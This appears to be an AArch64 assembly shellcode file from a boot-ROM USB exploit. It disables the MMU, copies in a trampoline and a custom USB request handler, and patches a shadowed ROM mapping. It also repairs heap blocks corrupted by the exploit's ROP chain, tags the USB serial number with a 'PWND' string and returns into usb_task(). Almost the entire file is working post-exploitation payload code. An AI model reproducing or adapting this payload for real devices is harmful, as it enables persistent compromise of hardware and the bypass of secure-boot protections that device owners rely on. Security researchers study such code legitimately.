#include "offsets.h"

.set handler_off,   0x3C00
.set ret_tramp_off, 0x3F00

.text
.align 4

.globl start
start:
    msr DAIFSet, #0xf

    // disable MMU for now
    dsb sy
    mrs x0, sctlr_el1
    and x0, x0, #(~(1 << 0))
    msr sctlr_el1, x0
    isb sy

    // switch stack
    ldr x0, =NEW_SP
    mov sp, x0

    adr x24, start          // boot trampoline base

    // copy return tramp to the end of tramp page
    mov x1, ret_tramp_off
    add x0, x24, x1         // destination - the end of the trampoline area
    mov x22, x0             // save for later - we'll have to jump there in the end

    adr x1, trampoline      // source - trampoline asm
    adr x2, trampoline_end
    sub x2, x2, x1          // size - trampoline length

    ldr x8, _memcpy
    blr x8

    // copy handler code as well
    mov x1, handler_off
    add x0, x24, x1         // destination - (almost) the end of the trampoline area
    mov x24, x0

    // I hate this assembler
    // adr xN, text_addr - yay!
    // adr xN, data_addr - nay!
    adrp x1, handler_len@page
    add  x1, x1, handler_len@pageoff

    ldr w2, [x1]            // size of our custom handler

    // this will be the actual handler text
    add x1, x1, #0x10

    ldr x8, _memcpy
    blr x8

    // overlaid onto rom in MMU so we can do some patches.
    ldr x0, =ROM_SHADOW_PA
    ldr x1, =ROM_BASE
    mov x2, ROM_SHADOW_SIZE
    ldr x8, _memcpy
    blr x8

    // load area patch
    ldr x0, =(ROM_SHADOW_PA + ROM_LOAD_AREA_PATCH)
    ldr w1, =0x10000060       // adr x0, +0xc
    str w1, [x0, #0x0]
    ldr w1, =0xb9400000       // ldr w0, [x0]
    str w1, [x0, #0x4]
    ldr w1, =0xd65f03c0       // ret
    str w1, [x0, #0x8]
    ldr w1, =LOAD_AREA_SIZE
    str w1, [x0, #0xc]

    // dont mess w/ overlay
    ldr x0, =(ROM_SHADOW_PA + ROM_REMAP_CALL_PATCH)
    ldr w1, =0xd503201f
    str w1, [x0]

    ldr x0, =ROM_SHADOW_TABLE_PA
    ldr x1, =ROM_BASE
    mov x2, ROM_TABLE_ENTRIES
    mov x3, #0x6e7
    mov x4, ROM_PAGE_SIZE

rom_shadow_table_loop:
    orr x5, x1, x3
    str x5, [x0], #0x8
    add x1, x1, x4
    subs x2, x2, #0x1
    b.ne rom_shadow_table_loop

    ldr x0, =ROM_SHADOW_TABLE_PA
    ldr x1, =ROM_SHADOW_PA
    orr x1, x1, x3
    mov x2, ROM_SHADOW_PAGES

rom_shadow_map_loop:
    str x1, [x0], #0x8
    add x1, x1, ROM_PAGE_SIZE
    subs x2, x2, #0x1
    b.ne rom_shadow_map_loop

    // Break the old block mapping before installing the subordinate table.
    ldr x0, =ROM_ROOT_PTEP
    str xzr, [x0]
    dsb sy
    tlbi vmalle1
    dsb sy
    isb

    ldr x1, =ROM_SHADOW_TABLE_PA
    orr x1, x1, #0x3
    str x1, [x0]
    dsb sy
    tlbi vmalle1
    dsb sy
    isb

    // make boot trampoline executable in all CPU modes as normal memory
    ldr x0, =BOOT_TRAMP_PTEP
    ldr x1, =BOOT_TRAMP_PTE
    str x1, [x0]

    // flush TLB
    dsb sy
    tlbi vmalle1
    dsb sy
    isb sy

    // Clean copied code to PoU before fetching it through the cacheable mapping.
    ldr x0, =TRAMP_BASE
    add x1, x0, #0x4000

tramp_dcache_clean_loop:
    dc  cvau, x0
    add x0, x0, #0x40
    cmp x0, x1
    b.lo tramp_dcache_clean_loop

    dsb sy

    // invalidate icache
    ic  iallu
    dsb sy
    isb sy

    // re-enable MMU again now that we are done copying code around
    mrs x0, sctlr_el1
    orr x0, x0, #((1 << 0))
    msr sctlr_el1, x0

    dsb sy
    isb sy

    // set the callback addr
    ldr x1, =USB_REQ_HANDLER_CB_ADDR
    str x24, [x1]

    // fix that one corrupted block that we can't
    // reliably overwrite in the exploit
    ldr x0, =HEAP_BLOCK_TO_REPAIR_DMA
    stp xzr, xzr, [x0, #0x0]
    stp xzr, xzr, [x0, #0x10]
    stp xzr, xzr, [x0, #0x20]
    stp xzr, xzr, [x0, #0x30]

    mov w1, #0x2        // this_size
    str w1, [x0, #0x20]

    mov w1, #0xc        // prev_size
    str w1, [x0, #0x28]

    mov w1, #0x80       // padding
    str w1, [x0, #0x30]

    ldr x1, =HEAP_WHATEVER_THAT_IS
    str x1, [x0, #0x18]

    // ...and actually another one, too,
    // since it's overwritten by the ROP chain
    // XXX move ROP chain inside the io_buffer?
    ldr x0, =HEAP_BLOCK_TO_REPAIR_IO_BUF
    stp xzr, xzr, [x0, #0x0]
    stp xzr, xzr, [x0, #0x10]
    stp xzr, xzr, [x0, #0x20]
    stp xzr, xzr, [x0, #0x30]

    // already there
    // ldr x1, =HEAP_WHATEVER_THAT_IS
    str x1, [x0, #0x18]

    mov w1, #0x21       // this_size
    str w1, [x0, #0x20]

    mov w1, #0x404      // prev_size
    str w1, [x0, #0x28]

    mov w1, #0x840      // padding
    str w1, [x0, #0x30]

    // gotta point USB DMA back where it belongs
    ldr w1, =DMA_BUF_LO
    ldr x0, =USB_DMA_DEST
    str w1, [x0]

    // gotta reset *jump* state
    ldr x0, =JUMP_STATE
    mov x1, #0x0
    str w1, [x0]

    // fix corrupted heap blocks' checksum
    adr x19, heap_blocks
    adr x20, heap_blocks_end
    ldr x21, =CALCULATE_HEAP_BLOCK_SUM

heap_fix_loop:
    ldr x0, [x19], #0x8
    blr x21
    cmp x19, x20
    bne heap_fix_loop

    // add PWND string to USB SN
    ldr x0, =USB_SN_STR
    adr x1, pwnd_str
    mov x2, #127
    mov x3, #127
    ldr x8, =STRLCAT
    blr x8

    ldr x0, =USB_SN_STR
    ldr x8, =USB_DESC_MAKE_STR
    blr x8

    ldr x1, =USB_DEV_DESC_SN_IDX
    strb w0, [x1]

    // fix usb_task()'s stack frame & higher regs
    // This is target-specific
    #include "cleanup.S"

    // go to return trampoline
    br  x22

.balign 8
heap_blocks:
    #include "blocks.S"
heap_blocks_end:

pwnd_str:
    .asciz " PWND:[usbliter8] L41kA:[+]"

// this "return" trampoline is needed because we'd like
// to restore the original boot trampoline
.balign 16
trampoline:
    // disable MMU for now
    mrs x0, sctlr_el1
    and x0, x0, #(~(1 << 0))
    msr sctlr_el1, x0

    dsb sy
    isb sy

    // copying the original trampoline back
    ldr x0, _tramp_base
    ldr x1, _rom_tramp
    mov x2, ROM_TRAMP_LEN
    ldr x8, _memcpy
    blr x8

    // invalidate icache
    ic  iallu
    dsb sy
    isb sy

    // set original SCTLR
    ldr x0, _sctlr_val
    msr sctlr_el1, x0

    dsb sy
    isb sy

    // this is set to a weird state in the jump() function
    mov x0, #0x201
    msr CNTKCTL_EL1, x0

    // where we return (inside usb_task())
    ldr x0, _elr_val
    msr elr_el1, x0

    // CPSR when we return
    mov x0, 0x100
    msr spsr_el1, x0

    eret

.balign 8
_tramp_base:
    .8byte TRAMP_BASE

_rom_tramp:
    .8byte ROM_TRAMP

_memcpy:
    .8byte MEMCPY

_sctlr_val:
    .8byte 0x34DD5B8D

_elr_val:
    .8byte RETURN_TO_EL0_ADDR

trampoline_end:

// gotta move this into a separate segment,
// since otherwise constant pool will be
// at the end of the shellcode, and not this
.data
handler_len:
    .4byte 0xDEADDEAD   // populated dynamically by the exploit

.balign 16
handler_start:
